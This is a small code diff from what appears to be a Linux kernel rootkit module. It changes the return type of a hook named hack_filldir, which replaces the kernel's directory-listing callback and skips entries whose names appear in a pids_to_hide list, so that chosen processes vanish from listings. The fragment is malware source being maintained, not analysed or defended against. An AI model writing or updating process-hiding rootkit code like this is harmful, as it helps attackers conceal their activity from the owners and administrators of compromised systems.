@@ -15,7 +15,7 @@ static int hide_process_active = 0; // active switch
 
 
 // function to replace the original filldir, same type as filldir_t
-static int hack_filldir(struct dir_context *ctx, const char *name, int len, loff_t off, u64 ino, unsigned intd_type){
+static bool hack_filldir(struct dir_context *ctx, const char *name, int len, loff_t off, u64 ino, unsigned intd_type){
     if(find_node(&pids_to_hide, (char *)name) == 0){ // check if process is for hiding
         return 0;
     }
